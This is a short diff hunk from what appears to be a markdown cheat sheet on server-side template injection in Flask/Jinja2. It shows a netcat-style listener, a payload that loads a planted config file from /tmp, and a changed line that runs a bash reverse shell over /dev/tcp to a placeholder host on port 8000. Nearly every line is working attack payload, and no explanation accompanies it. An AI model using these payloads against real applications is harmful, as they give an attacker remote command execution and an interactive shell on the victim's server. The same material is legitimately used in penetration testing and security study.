@@ -277,7 +277,7 @@ nv -lnvp 8000
 {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
 
 # connect to evil host
-{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} 
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
 ```
 
 
